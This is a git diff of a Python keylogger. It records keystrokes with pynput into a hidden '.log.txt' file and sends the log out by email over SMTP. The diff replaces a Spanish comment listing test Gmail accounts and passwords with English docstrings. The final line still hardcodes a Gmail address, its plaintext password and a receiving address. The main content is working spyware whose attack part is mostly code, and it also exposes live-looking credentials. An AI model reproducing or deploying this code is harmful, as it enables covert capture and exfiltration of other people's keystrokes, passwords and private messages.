@@ -3,17 +3,11 @@ from pynput import keyboard
 f = open('.log.txt',"a+")
 
 """
-===========================
-MAILS para hacer pruebas
-===========================
-teamcyber541@gmail.com
-password: thepantiesbreakers
+Allows to send log via mail (opening a client session using SMTP protocol). If a gmail account is used, enable access of unsafe applications in your google settings
 
-teamcyber5412@gmail.com
-password: thepantiesbreakers
-===========================
-
-Necesitamos habilitar el acceso de aplicaciones poco seguras en nuestra cuenta de gmail para que funcione
+:param sender: mail of the sender
+:param sender_password: password of the mail's sender
+:param receiver: mail of the receiver
 """
 def send_mail(sender, sender_password, reciever):
     import smtplib
@@ -51,6 +45,11 @@ def send_mail(sender, sender_password, reciever):
     s.sendmail(sender, reciever, msg.as_string())
     s.quit()
 
+"""
+Very simple handler of the keyboard listener
+
+:param key: key pressed
+"""
 def on_press(key):
     if key == keyboard.Key.esc:
         return False  # stop listener
@@ -78,4 +77,3 @@ f.close()
 
 # send mail
 send_mail('teamcyber541@gmail.com', 'thepantiesbreakers', 'teamcyber5412@gmail.com')
-print('Mail Sent')
